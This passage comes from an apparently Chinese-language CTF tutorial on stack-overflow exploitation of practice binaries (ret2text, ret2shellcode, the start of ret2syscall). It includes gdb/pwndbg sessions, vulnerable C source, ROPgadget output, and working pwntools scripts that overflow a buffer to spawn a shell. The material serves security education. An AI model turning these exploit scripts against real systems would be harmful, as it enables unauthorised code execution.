+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb ret2text <span class="c1">#启动gdb</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; cyclic <span class="m">200</span> 
+</span></span><span class="line"><span class="cl">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行程序之后输入造成程序崩溃，gdb报错是因为返回地址被我们填充的字符覆盖掉，导致程序无法正常跳转</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; r <span class="c1">#运行</span>
+</span></span><span class="line"><span class="cl">Starting program: /home/gnq/exam/ret2text 
+</span></span><span class="line"><span class="cl">There is something amazing here, <span class="k">do</span> you know anything?
+</span></span><span class="line"><span class="cl">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+</span></span><span class="line"><span class="cl">Maybe I will tell you next <span class="nb">time</span> !
+</span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
+</span></span><span class="line"><span class="cl">0x62616164 in ?? <span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看输出位置到报错位置的距离，得到112（0x6c+0x4），那么我们就需要填充112个无用字符才可以溢出到返回地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; cyclic -l 0x62616164
+</span></span><span class="line"><span class="cl"><span class="m">112</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>编写攻击脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2text&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys_sh_addr</span><span class="o">=</span><span class="mh">0x804863A</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">112</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_sh_addr</span><span class="p">)</span> <span class="c1">#padding+ret_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ret2shellcode" class="headerLink">
+    <a href="#ret2shellcode" class="header-mark"></a>ret2shellcode</h2><p>ret2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。这需要我们将一段shellcode填充到有可执行权限的区域，如栈上或者bss段，并且把返回地址指向shellcode的起始位置。</p>
+<p>以下面为例，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example" target="_blank" rel="noopener noreffer">题目地址</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;No system for you this time !!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bye bye ~&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看保护机制，几乎没有开启保护，而且还有可读可写可执行的段存在</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/exam$ checksec ret2shellcode
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gnq/exam/ret2shellcode&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX disabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用IDA打开，F5反汇编得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-64h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;No system for you this time !!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">,</span> <span class="mh">0x64u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bye bye ~&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样是gets函数存在栈溢出漏洞，可以看到strncpy将v4的内容复制到buf2</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mi">0804</span><span class="n">A080</span> <span class="n">buf2</span>            <span class="n">db</span> <span class="mi">64</span><span class="n">h</span> <span class="n">dup</span><span class="p">(</span><span class="o">?</span><span class="p">)</span>           <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">main</span><span class="o">+</span><span class="mi">7</span><span class="n">B</span><span class="err">↑</span><span class="n">o</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过IDA可以看到buf2在bss段上，地址为0804A080</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/test$ gdb ret2shellcode
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; b main
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; r
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; vmmap
+</span></span><span class="line"><span class="cl">LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+</span></span><span class="line"><span class="cl"> 0x8048000  0x8049000 r-xp     <span class="m">1000</span> <span class="m">0</span>      /home/gnq/exam/ret2shellcode
+</span></span><span class="line"><span class="cl"> 0x8049000  0x804a000 r-xp     <span class="m">1000</span> <span class="m">0</span>      /home/gnq/exam/ret2shellcode
+</span></span><span class="line"><span class="cl"> 0x804a000  0x804b000 rwxp     <span class="m">1000</span> <span class="m">1000</span>   /home/gnq/exam/ret2shellcode <span class="c1">#buf2</span>
+</span></span><span class="line"><span class="cl">0xf7e02000 0xf7e03000 rwxp     <span class="m">1000</span> <span class="m">0</span>      
+</span></span><span class="line"><span class="cl">0xf7e03000 0xf7fb3000 r-xp   1b0000 <span class="m">0</span>      /lib/i386-linux-gnu/libc-2.23.so
+</span></span><span class="line"><span class="cl">0xf7fb3000 0xf7fb4000 ---p     <span class="m">1000</span> 1b0000 /lib/i386-linux-gnu/libc-2.23.so
+</span></span><span class="line"><span class="cl">0xf7fb4000 0xf7fb6000 r-xp     <span class="m">2000</span> 1b0000 /lib/i386-linux-gnu/libc-2.23.so
+</span></span><span class="line"><span class="cl">0xf7fb6000 0xf7fb7000 rwxp     <span class="m">1000</span> 1b2000 /lib/i386-linux-gnu/libc-2.23.so
+</span></span><span class="line"><span class="cl">0xf7fb7000 0xf7fba000 rwxp     <span class="m">3000</span> <span class="m">0</span>      
+</span></span><span class="line"><span class="cl">0xf7fd3000 0xf7fd4000 rwxp     <span class="m">1000</span> <span class="m">0</span>      
+</span></span><span class="line"><span class="cl">0xf7fd4000 0xf7fd7000 r--p     <span class="m">3000</span> <span class="m">0</span>      <span class="o">[</span>vvar<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0xf7fd7000 0xf7fd9000 r-xp     <span class="m">2000</span> <span class="m">0</span>      <span class="o">[</span>vdso<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0xf7fd9000 0xf7ffc000 r-xp    <span class="m">23000</span> <span class="m">0</span>      /lib/i386-linux-gnu/ld-2.23.so
+</span></span><span class="line"><span class="cl">0xf7ffc000 0xf7ffd000 r-xp     <span class="m">1000</span> <span class="m">22000</span>  /lib/i386-linux-gnu/ld-2.23.so
+</span></span><span class="line"><span class="cl">0xf7ffd000 0xf7ffe000 rwxp     <span class="m">1000</span> <span class="m">23000</span>  /lib/i386-linux-gnu/ld-2.23.so
+</span></span><span class="line"><span class="cl">0xfffdd000 0xffffe000 rwxp    <span class="m">21000</span> <span class="m">0</span>      <span class="o">[</span>stack<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过vmmap可以看到bss段刚好有可执行权限，那么就可以将shellcode写入buf2中，然后通过栈溢出漏洞控制返回地址到buf2来执行shellcode</p>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/ret2shellcode.png"
+        data-srcset="/BasicROP.assets/ret2shellcode.png, /BasicROP.assets/ret2shellcode.png 1.5x, /BasicROP.assets/ret2shellcode.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/ret2shellcode.png"
+        title="/BasicROP.assets/ret2shellcode.png"></p>
+<p>编写攻击脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!coding:utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2shellcode&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf2</span><span class="o">=</span><span class="mh">0x0804A080</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span><span class="c1">#pwntools生成的32位shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">shellcode</span><span class="o">+</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">112</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="c1">#shellcode+padding + ret_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ret2syscall" class="headerLink">
+    <a href="#ret2syscall" class="header-mark"></a>ret2syscall</h2><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
+<p>在用户空间和内核空间之间，有一个叫做Syscall(系统调用)的中间层，是连接用户态和内核态的桥梁。这样即提高了内核的安全型，也便于移植，只需实现同一套接口即可。Linux系统，用户空间通过向内核空间发出Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作。</p>
+<p>应用程序调用系统调用的过程：</p>
+<ul>
+<li>把系统调用号存入 eax</li>
+<li>把函数参数存入其它通用寄存器</li>
+<li>触发 0x80 号中断（ int 0x80 ）</li>
+</ul>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall" target="_blank" rel="noopener noreffer">题目地址</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;This time, no system() and NO SHELLCODE!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What do you plan to do?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看保护机制，只开启了NX</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/test$ checksec rop 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gnq/test/rop&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用IDA查看程序。gets存在栈溢出，但是程序没有后门函数可以直接调用，NX保护也导致shellcode无法使用。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-64h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;This time, no system() and NO SHELLCODE!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What do you plan to do?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里使用程序中的gadgets来getshell，其本质是利用系统调用。需要先把对应的系统调用号参数存放到对应的寄存器中，然后再执行int 0x80就可以实现对系统调用。</p>
+<p>这题需要利用<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>，其系统调用号是11，十六进制为0xb。其他系统调用可以参考<a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener noreffer">Linux 32位系统调用表</a></p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执 行sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>下面就是通过pop把参数存到对应寄存器中，然后用ret再次控制程序的流程，将gadgets串联成payload就可以getshell。</p>
+<p>现在可以用ROPgadgets来获取程序中的gadgets，先获取控制eax的gadgets，然后通过一样的方法获取到其他寄存器的gadgets</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/test$ ROPgadget --binary rop --only <span class="s1">&#39;pop|ret&#39;</span> <span class="p">|</span> grep eax
+</span></span><span class="line"><span class="cl">0x0809ddda : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x080bb196 : pop eax <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0807217a : pop eax <span class="p">;</span> ret 0x80e
+</span></span><span class="line"><span class="cl">0x0804f704 : pop eax <span class="p">;</span> ret <span class="m">3</span>
+</span></span><span class="line"><span class="cl">0x0809ddd9 : pop es <span class="p">;</span> pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取程序中/bin/sh的地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/test$ ROPgadget --binary rop --string <span class="s1">&#39;/bin/sh&#39;</span>
+</span></span><span class="line"><span class="cl">Strings <span class="nv">information</span>
+</span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
+</span></span><span class="line"><span class="cl">0x080be408 : /bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取int 0x80的地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
